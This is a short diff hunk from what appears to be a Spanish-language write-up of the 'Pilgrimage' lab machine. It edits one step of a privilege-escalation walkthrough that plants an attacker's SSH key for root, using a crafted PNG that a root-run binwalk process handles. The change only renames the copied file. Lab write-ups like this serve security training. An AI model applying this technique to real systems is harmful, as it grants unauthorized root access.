@@ -182,7 +182,7 @@ ssh-keygen -t ed25519 -f ed25519_gen -N ""
 python3 walkingpath.py ssh root.png ed25519_gen.pub
 
 # 3) Lo copiamos a la carpeta vigilada
-cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
+cp root.png /var/www/pilgrimage.htb/shrunk/
 ```
 
 En cuanto el script procesa el PNG, nuestra clave queda autorizada para root. Entramos por SSH:
